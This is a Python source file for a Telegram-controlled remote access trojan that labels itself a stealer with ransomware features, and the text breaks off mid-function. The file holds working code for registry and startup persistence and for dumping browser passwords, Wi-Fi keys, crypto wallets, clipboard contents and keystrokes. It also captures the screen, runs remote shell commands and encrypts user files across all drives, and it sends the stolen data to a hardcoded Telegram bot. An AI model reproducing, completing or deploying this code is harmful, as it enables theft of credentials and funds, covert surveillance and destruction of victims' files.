#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import base64
import sqlite3
import subprocess
import shutil
import tempfile
import time
import threading
import platform
import socket
import urllib.request
import urllib.parse
import re
from datetime import datetime
from pathlib import Path
import asyncio

# Telegram Bot API
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
except ImportError:
    print("Installing python-telegram-bot...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot==20.7"])
    from telegram import Update
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ========== CONFIGURATION ==========
BOT_TOKEN = "8972955677:AAGTvv9T5z9Qmk5Paig2Jp8dhi6sGkjdTSY"
CHAT_ID = 7361517001  # Replace with your chat ID

# ========== GLOBALS ==========
victim_id = ""
screenshot_enabled = True
screenshot_interval = 300  # 5 minutes
keylog_active = False
keylog_buffer = []
encryption_key = None
encryption_nonce = None
bot_app = None
loop = None

# ========== SYSTEM INFO ==========
def get_system_info():
    host = socket.gethostname()
    user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    ip = get_ip()
    os_info = platform.system() + " " + platform.release()
    return f"Host: {host}\nUser: {user}\nOS: {os_info}\nIP: {ip}\nID: {victim_id}"

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=text", timeout=5) as response:
            return response.read().decode().strip()
    except:
        return "Unknown"

def get_system_info_broadcast():
    host = socket.gethostname()
    user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    ip = get_ip()
    os_info = platform.system() + " " + platform.release()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    return f"""🖥️ *🚀 VICTIM CONNECTED SUCCESSFULLY!* 🖥️

📌 *System Information:*
─────────────────────
🏷️ *ID:* `{victim_id}`
💻 *Hostname:* {host}
👤 *Username:* {user}
🖥️ *OS:* {os_info}
🌐 *IP Address:* {ip}
🕐 *Time:* {now}
─────────────────────
✅ *Status:* ONLINE
🔒 *Encryption:* READY
📸 *Screenshot:* ACTIVE (every 5 min)
⌨️ *Keylogger:* STANDBY

*Commands:* /help for full list"""

def generate_id():
    host = socket.gethostname()
    user = os.getenv("USERNAME") or os.getenv("USER") or "Unknown"
    data = host + user + str(time.time())
    return base64.b64encode(data.encode()).decode()[:16]

# ========== PERSISTENCE ==========
def add_persistence():
    if platform.system() != "Windows":
        return
    
    exe_path = sys.argv[0]
    name = random_string(8)
    
    # Registry Run
    try:
        subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{name}" /t REG_SZ /d "{exe_path}" /f', 
                      shell=True, capture_output=True)
    except:
        pass
    
    # Startup Folder
    try:
        startup = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        if os.path.exists(startup):
            link_path = os.path.join(startup, random_string(8) + ".lnk")
            ps_cmd = f'''$WshShell = New-Object -comObject WScript.Shell; 
$Shortcut = $WshShell.CreateShortcut("{link_path}"); 
$Shortcut.TargetPath = "{exe_path}"; 
$Shortcut.Save()'''
            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True)
    except:
        pass

def random_string(n):
    import random
    import string
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

# ========== SCREENSHOT ==========
def capture_screenshot_base64():
    if platform.system() != "Windows":
        return ""
    
    ps_cmd = '''
Add-Type -AssemblyName System.Drawing;
Add-Type -AssemblyName System.Windows.Forms;
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;
$bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height);
$g = [System.Drawing.Graphics]::FromImage($bmp);
$g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bmp.Size);
$ms = New-Object System.IO.MemoryStream;
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png);
[Convert]::ToBase64String($ms.ToArray())
'''
    try:
        result = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], 
                              capture_output=True, text=True, timeout=30)
        return result.stdout.strip()
    except:
        return ""

# ========== CLIPBOARD ==========
def get_clipboard_text():
    if platform.system() != "Windows":
        return ""
    
    ps_cmd = '''
Add-Type -AssemblyName System.Windows.Forms;
[System.Windows.Forms.Clipboard]::GetText()
'''
    try:
        result = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], 
                              capture_output=True, text=True, timeout=10)
        return result.stdout.strip()
    except:
        return ""

# ========== WIFI PASSWORDS ==========
def get_wifi_passwords():
    if platform.system() != "Windows":
        return "Wi-Fi extraction only supported on Windows"
    
    try:
        result = subprocess.run(["netsh", "wlan", "show", "profiles"], 
                               capture_output=True, text=True)
        lines = result.stdout.split('\n')
        profiles = []
        for line in lines:
            if "All User Profile" in line:
                parts = line.split(":")
                if len(parts) >= 2:
                    profile = parts[1].strip()
                    if profile:
                        profiles.append(profile)
        
        wifi_list = []
        for p in profiles:
            try:
                result2 = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"],
                                        capture_output=True, text=True)
                for line in result2.stdout.split('\n'):
                    if "Key Content" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            wifi_list.append(f"{p} : {parts[1].strip()}")
            except:
                continue
        
        if not wifi_list:
            return "No Wi-Fi passwords found"
        return "\n".join(wifi_list)
    except Exception as e:
        return f"Failed to get Wi-Fi: {str(e)}"

# ========== PROCESSES ==========
def list_processes():
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["tasklist", "/v", "/fo", "csv"], 
                                   capture_output=True, text=True, timeout=10)
            lines = result.stdout.split('\n')
            if len(lines) > 50:
                lines = lines[:50]
            return "\n".join(lines)
        else:
            result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
            return result.stdout[:4096]
    except Exception as e:
        return f"Failed to list processes: {str(e)}"

def kill_process(pid):
    try:
        if platform.system() == "Windows":
            subprocess.run(["taskkill", "/PID", str(pid), "/F"], capture_output=True)
        else:
            os.kill(int(pid), 15)
        return True
    except:
        return False

# ========== EXECUTE COMMAND ==========
def exec_shell(cmd):
    try:
        if platform.system() == "Windows":
            result = subprocess.run(["cmd", "/c", cmd], capture_output=True, text=True, timeout=30)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

# ========== BROWSER PASSWORDS ==========
def extract_chromium_passwords():
    if platform.system() != "Windows":
        return "Only supported on Windows"
    
    appdata = os.getenv("LOCALAPPDATA")
    if not appdata:
        return "No LOCALAPPDATA found"
    
    browsers = []
    try:
        for entry in os.listdir(appdata):
            path = os.path.join(appdata, entry)
            if not os.path.isdir(path):
                continue
            
            # Check for Local State file
            local_state_paths = [
                os.path.join(path, "Local State"),
                os.path.join(path, "User Data", "Local State")
            ]
            local_state_path = None
            for p in local_state_paths:
                if os.path.exists(p):
                    local_state_path = p
                    break
            
            if not local_state_path:
                continue
            
            # Read Local State
            try:
                with open(local_state_path, 'r', encoding='utf-8') as f:
                    state = json.load(f)
            except:
                continue
            
            # Get encrypted key
            os_crypt = state.get("os_crypt", {})
            enc_key_b64 = os_crypt.get("encrypted_key")
            if not enc_key_b64:
                continue
            
            try:
                enc_key = base64.b64decode(enc_key_b64)
                if len(enc_key) < 5:
                    continue
                enc_key = enc_key[5:]  # Strip "DPAPI"
            except:
                continue
            
            # Decrypt using DPAPI via PowerShell
            aes_key = decrypt_dpapi(enc_key)
            if not aes_key:
                continue
            
            # Find Login Data
            base_dir = os.path.dirname(local_state_path)
            login_data_path = None
            for sub in ["Default", "Profile 1", "Profile 2", "Profile 3"]:
                test_path = os.path.join(base_dir, sub, "Login Data")
                if os.path.exists(test_path):
                    login_data_path = test_path
                    break
            
            if not login_data_path:
                continue
            
            # Copy to temp
            with tempfile.NamedTemporaryFile(suffix='.db', delete=False) as tmp:
                tmp_name = tmp.name
            shutil.copy2(login_data_path, tmp_name)
            
            try:
                conn = sqlite3.connect(tmp_name)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                rows = cursor.fetchall()
                
                for row in rows:
                    url, username, pwd_blob = row
                    if not pwd_blob:
                        continue
                    
                    # Decrypt password
                    plain = decrypt_aesgcm(aes_key, pwd_blob)
                    if not plain:
                        plain = decrypt_dpapi(pwd_blob)
                    
                    if plain:
                        browsers.append({
                            "url": url,
                            "username": username,
                            "password": plain.decode('utf-8', errors='ignore')
                        })
                conn.close()
            except Exception as e:
                pass
            
            os.unlink(tmp_name)
    except Exception as e:
        pass
    
    if not browsers:
        return "No Chromium passwords found"
    return json.dumps(browsers, indent=2)

def decrypt_dpapi(ciphertext):
    if not ciphertext:
        return None
    
    encoded = base64.b64encode(ciphertext).decode()
    ps_cmd = f'''
Add-Type -AssemblyName System.Security
$data = [System.Convert]::FromBase64String('{encoded}')
try {{
    $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($data, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    [System.Convert]::ToBase64String($decrypted)
}} catch {{
    Write-Host ""
}}
'''
    try:
        result = subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], 
                               capture_output=True, text=True, timeout=10)
        result_str = result.stdout.strip()
        if not result_str:
            return None
        return base64.b64decode(result_str)
    except:
        return None

def decrypt_aesgcm(key, ciphertext):
    if not key or len(ciphertext) < 12:
        return None
    
    try:
        from Crypto.Cipher import AES
        nonce = ciphertext[:12]
        ciphertext = ciphertext[12:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
    except:
        try:
            from Crypto.Cipher import AES
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ciphertext)
        except:
            return None

def extract_all_passwords():
    chromium = extract_chromium_passwords()
    if chromium == "No Chromium passwords found" or chromium == "Only supported on Windows":
        return "No passwords found in browsers"
    return "=== CHROMIUM BROWSERS ===\n" + chromium

# ========== WALLETS ==========
def extract_wallets():
    home = os.getenv("USERPROFILE") or os.getenv("HOME")
    if not home:
        return "No home directory found"
    
    wallet_dirs = [
        os.path.join(home, "AppData", "Roaming", "Bitcoin"),
        os.path.join(home, "AppData", "Roaming", "Ethereum"),
        os.path.join(home, "AppData", "Roaming", "Exodus"),
        os.path.join(home, "AppData", "Roaming", "Electrum"),
        os.path.join(home, "AppData", "Roaming", "Monero"),
        os.path.join(home, "AppData", "Roaming", "Dogecoin"),
        os.path.join(home, "AppData", "Roaming", "Litecoin"),
        os.path.join(home, ".bitcoin"),
        os.path.join(home, ".ethereum"),
        os.path.join(home, ".electrum"),
        os.path.join(home, ".monero"),
    ]
    
    wallet_patterns = [
        "wallet.dat", "keystore", "exodus.wallet", "electrum.dat",
        "wallet.json", "default_wallet", "wallet.aes.json"
    ]
    
    found = {}
    for wallet_dir in wallet_dirs:
        if not os.path.exists(wallet_dir):
            continue
        
        for root, dirs, files in os.walk(wallet_dir):
            for file in files:
                file_path = os.path.join(root, file)
                for pattern in wallet_patterns:
                    if pattern in file:
                        try:
                            with open(file_path, 'rb') as f:
                                data = f.read()
                                if len(data) < 1024 * 1024:  # < 1MB
                                    found[file_path] = base64.b64encode(data).decode()
                                break
                        except:
                            continue
                
                # Check JSON files for seeds/mnemonics
                if file.endswith('.json'):
                    try:
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                            if any(keyword in content.lower() for keyword in ['mnemonic', 'seed', 'private']):
                                with open(file_path, 'rb') as f:
                                    data = f.read()
                                    if len(data) < 1024 * 1024:
                                        found[file_path] = base64.b64encode(data).decode()
                    except:
                        pass
    
    if not found:
        return "No wallets found"
    return json.dumps(found, indent=2)

# ========== SCREEN RECORDING ==========
def ensure_ffmpeg():
    # Check common paths
    paths = ["ffmpeg.exe", os.path.join(os.getenv("TEMP", ""), "ffmpeg.exe")]
    for p in paths:
        if os.path.exists(p):
            return p
    
    # Try to find in PATH
    try:
        import shutil
        ffmpeg_path = shutil.which("ffmpeg")
        if ffmpeg_path:
            return ffmpeg_path
    except:
        pass
    
    # Download ffmpeg
    try:
        import zipfile
        url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        tmp_dir = tempfile.gettempdir()
        zip_path = os.path.join(tmp_dir, "ffmpeg.zip")
        exe_path = os.path.join(tmp_dir, "ffmpeg.exe")
        
        urllib.request.urlretrieve(url, zip_path)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            zip_ref.extractall(tmp_dir)
        
        # Find ffmpeg.exe
        for root, dirs, files in os.walk(tmp_dir):
            if "ffmpeg.exe" in files:
                src = os.path.join(root, "ffmpeg.exe")
                shutil.copy2(src, exe_path)
                os.chmod(exe_path, 0o755)
                return exe_path
    except:
        pass
    
    return ""

def record_screen(duration):
    ffmpeg_path = ensure_ffmpeg()
    if not ffmpeg_path:
        return "ffmpeg not available"
    
    output_file = os.path.join(tempfile.gettempdir(), f"recording_{int(time.time())}.mp4")
    
    try:
        subprocess.run([
            ffmpeg_path, "-f", "gdigrab", "-i", "desktop",
            "-t", str(duration), "-c:v", "libx264",
            "-preset", "veryfast", "-y", output_file
        ], capture_output=True, timeout=duration + 30)
        
        with open(output_file, 'rb') as f:
            data = f.read()
        os.unlink(output_file)
        return base64.b64encode(data).decode()
    except Exception as e:
        return ""

# ========== ENCRYPTION ==========
def load_or_generate_encryption_key():
    global encryption_key, encryption_nonce
    
    key_path = os.path.join(os.getenv("APPDATA", ""), ".encryption_key")
    try:
        with open(key_path, 'r') as f:
            data = f.read()
        parts = data.split(":")
        if len(parts) == 2:
            encryption_key = bytes.fromhex(parts[0])
            encryption_nonce = bytes.fromhex(parts[1])
            return
    except:
        pass
    
    encryption_key = os.urandom(32)
    encryption_nonce = os.urandom(12)
    key_str = encryption_key.hex() + ":" + encryption_nonce.hex()
    try:
        with open(key_path, 'w') as f:
            f.write(key_str)
    except:
        pass

def encrypt_files(root_path):
    if not root_path:
        drives = ["C:\\", "D:\\", "E:\\", "F:\\"]
        for d in drives:
            if os.path.exists(d):
                walk_and_encrypt(d)
    else:
        if os.path.exists(root_path):
            walk_and_encrypt(root_path)
    
    send_message_sync("🔒 Encryption completed")

def walk_and_encrypt(root):
    extensions = [".txt", ".doc", ".docx", ".pdf", ".jpg", ".png", ".zip", ".rar", ".json", ".xml", ".db", ".sqlite"]
    skip_dirs = ["Windows", "System32", "Program Files", "Program Files (x86)"]
    
    for dirpath, dirnames, filenames in os.walk(root):
        # Skip system directories
        should_skip = False
        for skip in skip_dirs:
            if skip in dirpath:
                should_skip = True
                break
        if should_skip:
            continue
        
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            if ".encryption_key" in file_path or ".encrypted" in file_path:
                continue
            
            ext = os.path.splitext(filename)[1].lower()
            if ext in extensions:
                encrypt_file(file_path)

def encrypt_file(file_path):
    try:
        from Crypto.Cipher import AES
        with open(file_path, 'rb') as f:
            data = f.read()
        
        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=encryption_nonce)
        encrypted, tag = cipher.encrypt_and_digest(data)
        
        with open(file_path + ".encrypted", 'wb') as f:
            f.write(encryption_nonce + tag + encrypted)
        
        os.unlink(file_path)
    except:
        pass

def decrypt_files(root_path):
    if not root_path:
        drives = ["C:\\", "D:\\", "E:\\", "F:\\"]
        for d in drives:
            if os.path.exists(d):
                walk_and_decrypt(d)
    else:
        if os.path.exists(root_path):
            walk_and_decrypt(root_path)
    
    send_message_sync("🔓 Decryption completed")

def walk_and_decrypt(root):
    for dirpath, dirnames, filenames in os.walk(root):
        for filename in filenames:
            if filename.endswith(".encrypted"):
                decrypt_file(os.path.join(dirpath, filename))

def decrypt_file(file_path):
    try:
        from Crypto.Cipher import AES
        with open(file_path, 'rb') as f:
            data = f.read()
        
        if len(data) < 28:  # nonce (12) + tag (16)
            return
        
        nonce = data[:12]
        tag = data[12:28]
        ciphertext = data[28:]
        
        cipher = AES.new(encryption_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        orig_path = file_path[:-10]  # Remove .encrypted
        with open(orig_path, 'wb') as f:
            f.write(plaintext)
        
        os.unlink(file_path)
    except:
        pass

# ========== KEYLOGGER ==========
def start_keylogger():
    global keylog_active
    if keylog_active:
        return
    
    keylog_active = True
    def keylogger_thread():
        ps_cmd = '''
Add-Type -AssemblyName System.Windows.Forms
while($true) {
    try {
        0..255 | ForEach-Object {
            $vk = [System.Windows.Forms.Keys]$_;
            if([System.Windows.Forms.Control]::IsKeyLocked($vk) -or [System.Windows.Forms.Control]::IsKeyDown($vk)) {
                Write-Host $vk.ToString()
            }
        }
        Start-Sleep -Milliseconds 100
    } catch {
        Start-Sleep -Milliseconds 100
    }
}
'''
        try:
            process = subprocess.Popen(["powershell", "-NoProfile", "-Command", ps_cmd],
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            while keylog_active:
                line = process.stdout.readline()
                if line:
                    keylog_buffer.append(line.strip())
                    if len(keylog_buffer) > 1000:
                        keylog_buffer = keylog_buffer[-500:]
        except:
            pass
    
    threading.Thread(target=keylogger_thread, daemon=True).start()

def stop_keylogger():
    global keylog_active
    keylog_active = False

def get_keylog():
    logs = "\n".join(keylog_buffer)
    keylog_buffer.clear()
    return logs

# ========== BSOD ==========
def trigger_bsod():
    ps_cmd = '''
try {
    Stop-Computer -Force -ErrorAction SilentlyContinue
} catch {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll", SetLastError=true)]
    public static extern int NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ResponseOption, out uint Response);
}
"@
    [BSOD]::NtRaiseHardError(0xC0000001, 0, 0, [IntPtr]::Zero, 0, [ref]0)
}
'''
    subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], capture_output=True)

# ========== SELF-UPDATE ==========
def self_update(url):
    try:
        response = urllib.request.urlopen(url, timeout=30)
        data = response.read()
        
        exe_path = sys.argv[0]
        with open(exe_path + ".new", 'wb') as f:
            f.write(data)
        
        send_message_sync("✅ Update downloaded. Restart manually.")
    except Exception as e:
        send_message_sync(f"❌ Update failed: {str(e)}")

# ========== UNINSTALL ==========
def uninstall_self():
    if platform.system() == "Windows":
        subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /va /f', shell=True)
    
    try:
        os.unlink(sys.argv[0])
    except:
        pass
    
    os._exit(0)

# ========== TELEGRAM BOT HELPERS (SYNC VERSION) ==========
def send_message_sync(text):
    """Synchronous message sending for background threads"""
    if not bot_app:
        return
    
    try:
        # Use asyncio to run the coroutine
        if loop and loop.is_running():
            asyncio.run_coroutine_threadsafe(
                bot_app.bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='Markdown'),
                loop
            )
        else:
            # Fallback: create a new event loop
            asyncio.run(bot_app.bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='Markdown'))
    except:
        pass

def send_photo_sync(b64img, caption=""):
    if not bot_app or not b64img:
        return
    
    try:
        data = base64.b64decode(b64img)
        if loop and loop.is_running():
            asyncio.run_coroutine_threadsafe(
                bot_app.bot.send_photo(chat_id=CHAT_ID, photo=data, caption=caption),
                loop
            )
        else:
            asyncio.run(bot_app.bot.send_photo(chat_id=CHAT_ID, photo=data, caption=caption))
    except:
        pass

def send_document_sync(b64data, filename, caption=""):
    if not bot_app or not b64data:
        return
    
    try:
        data = base64.b64decode(b64data)
        if loop and loop.is_running():
            asyncio.run_coroutine_threadsafe(
                bot_app.bot.send_document(chat_id=CHAT_ID, document=data, filename=filename, caption=caption),
                loop
            )
        else:
            asyncio.run(bot_app.bot.send_document(chat_id=CHAT_ID, document=data, filename=filename, caption=caption))
    except:
        pass

# ========== TELEGRAM BOT HANDLERS ==========
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text(get_system_info_broadcast(), parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    help_text = """
🤖 *Stealer Commands*

🖼️ *Media*
/screenshot          - capture and send screenshot
/record [seconds]    - record screen for N seconds (default 10)

🔑 *Credentials*
/passwords           - dump saved passwords (browsers)
/wallets             - dump wallet files
/wifi                - show Wi-Fi passwords
/clipboard           - get clipboard text

📁 *File & System*
/exec <command>      - execute shell command
/download <path>     - download file
/upload <path>       - upload file (attach to message)
/browse <path>       - list directory
/ps                  - list processes
/kill <pid>          - kill process

⌨️ *Keylogger*
/keylog_start        - start keylogging
/keylog_stop         - stop keylogging
/keylog_get          - get captured keystrokes

💀 *Ransomware Features*
/bsod                - trigger Blue Screen of Death
/encrypt [path]      - encrypt files (default: all drives)
/decrypt [path]      - decrypt files (default: all drives)
/get_key             - get encryption key and nonce

⚙️ *Control*
/info                - system information
/persistence         - reapply persistence
/toggle_screenshot   - enable/disable periodic screenshot
/set_interval <min>  - set screenshot interval (minutes)
/update <url>        - self-update from URL
/uninstall           - remove self and exit
/help                - this message
"""
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("📸 Capturing screenshot...")
    img = capture_screenshot_base64()
    if img:
        await update.message.reply_photo(photo=base64.b64decode(img), caption="📸 Screenshot")
    else:
        await update.message.reply_text("❌ Screenshot failed")

async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    dur = 10
    if args:
        try:
            dur = int(args[0])
            if dur > 300:
                dur = 300
        except:
            pass
    
    await update.message.reply_text(f"🎥 Recording screen for {dur} seconds...")
    video = record_screen(dur)
    if video:
        await update.message.reply_document(document=base64.b64decode(video), filename="recording.mp4", caption="🎥 Screen recording")
    else:
        await update.message.reply_text("❌ Recording failed")

async def passwords_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("🔍 Extracting passwords...")
    pw = extract_all_passwords()
    if len(pw) > 4096:
        await update.message.reply_document(document=pw.encode(), filename="passwords.txt", caption="🔑 Passwords dump")
    else:
        await update.message.reply_text(f"🔑 Passwords:\n{pw}")

async def wallets_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("💰 Searching for wallets...")
    w = extract_wallets()
    if len(w) > 4096:
        await update.message.reply_document(document=w.encode(), filename="wallets.json", caption="💰 Wallet dump")
    else:
        await update.message.reply_text(f"💰 Wallets:\n{w}")

async def wifi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("📶 Extracting Wi-Fi passwords...")
    wifi = get_wifi_passwords()
    await update.message.reply_text(f"📶 Wi-Fi passwords:\n{wifi}")

async def clipboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    clip = get_clipboard_text()
    await update.message.reply_text(f"📋 Clipboard:\n{clip}")

async def exec_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /exec <command>")
        return
    
    cmd_str = " ".join(args)
    await update.message.reply_text(f"⚡ Executing: {cmd_str}")
    out = exec_shell(cmd_str)
    if len(out) > 4096:
        await update.message.reply_document(document=out.encode(), filename="exec_output.txt", caption="📄 Command output")
    else:
        await update.message.reply_text(f"📄 Output:\n{out}")

async def download_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /download <path>")
        return
    
    path = args[0]
    try:
        with open(path, 'rb') as f:
            data = f.read()
        await update.message.reply_document(document=data, filename=os.path.basename(path), caption=f"📁 File: {path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Download failed: {str(e)}")

async def upload_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /upload <path> (attach the file to this message)")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ Please attach the file to the message.")
        return
    
    dest_path = args[0]
    try:
        file = await update.message.document.get_file()
        os.makedirs(os.path.dirname(dest_path) or '.', exist_ok=True)
        await file.download_to_drive(dest_path)
        await update.message.reply_text(f"✅ File uploaded to {dest_path}")
    except Exception as e:
        await update.message.reply_text(f"❌ Upload failed: {str(e)}")

async def browse_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    path = args[0] if args else "."
    
    try:
        files = os.listdir(path)
        result = f"📂 Directory listing for {path}\n\n"
        for f in files:
            full_path = os.path.join(path, f)
            if os.path.isdir(full_path):
                result += "[DIR] "
            result += f
            result += "  "
            result += time.ctime(os.path.getmtime(full_path))
            result += "\n"
        
        if len(result) > 4096:
            result = result[:4096] + "\n... (truncated)"
        await update.message.reply_text(result)
    except Exception as e:
        await update.message.reply_text(f"❌ Browse failed: {str(e)}")

async def ps_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    procs = list_processes()
    await update.message.reply_text(f"📊 Processes:\n{procs}")

async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /kill <pid>")
        return
    
    try:
        pid = int(args[0])
        if kill_process(pid):
            await update.message.reply_text(f"✅ Process {pid} killed")
        else:
            await update.message.reply_text("❌ Failed to kill process")
    except:
        await update.message.reply_text("Invalid PID")

async def keylog_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    if not keylog_active:
        start_keylogger()
        await update.message.reply_text("⌨️ Keylogger started")
    else:
        await update.message.reply_text("Keylogger already running")

async def keylog_stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    if keylog_active:
        stop_keylogger()
        await update.message.reply_text("⌨️ Keylogger stopped")
    else:
        await update.message.reply_text("Keylogger not running")

async def keylog_get_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    logs = get_keylog()
    if not logs:
        await update.message.reply_text("No keystrokes logged")
    elif len(logs) > 4096:
        await update.message.reply_document(document=logs.encode(), filename="keylog.txt", caption="⌨️ Keylog")
    else:
        await update.message.reply_text(f"⌨️ Keylog:\n{logs}")

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text(f"🖥️ System info:\n{get_system_info()}")

async def persistence_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    add_persistence()
    await update.message.reply_text("♻️ Persistence reapplied")

async def toggle_screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    global screenshot_enabled
    screenshot_enabled = not screenshot_enabled
    status = "enabled" if screenshot_enabled else "disabled"
    await update.message.reply_text(f"🖼️ Periodic screenshot {status}")

async def set_interval_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /set_interval <minutes>")
        return
    
    try:
        minutes = int(args[0])
        if minutes < 1:
            await update.message.reply_text("Invalid interval")
            return
        
        global screenshot_interval
        screenshot_interval = minutes * 60
        await update.message.reply_text(f"🖼️ Screenshot interval set to {minutes} minutes")
    except:
        await update.message.reply_text("Invalid interval")

async def update_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /update <url>")
        return
    
    url = args[0]
    await update.message.reply_text("⬆️ Update initiated")
    threading.Thread(target=self_update, args=(url,), daemon=True).start()

async def bsod_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("💀 BSOD triggered")
    threading.Thread(target=trigger_bsod, daemon=True).start()

async def encrypt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    path = args[0] if args else ""
    await update.message.reply_text(f"🔒 Encryption started on {path or 'all drives'}")
    threading.Thread(target=encrypt_files, args=(path,), daemon=True).start()

async def decrypt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    args = context.args
    path = args[0] if args else ""
    await update.message.reply_text(f"🔓 Decryption started on {path or 'all drives'}")
    threading.Thread(target=decrypt_files, args=(path,), daemon=True).start()

async def get_key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    key_msg = f"🔑 Encryption Key (hex): {encryption_key.hex()}\nNonce (hex): {encryption_nonce.hex()}"
    await update.message.reply_text(key_msg)

async def uninstall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.chat_id != CHAT_ID:
        return
    await update.message.reply_text("🗑️ Uninstalling...")
    threading.Thread(target=uninstall_self, daemon=True).start()

def periodic_screenshot():
    global screenshot_enabled, screenshot_interval
    while True:
        if screenshot_enabled:
            img = capture_screenshot_base64()
            if img:
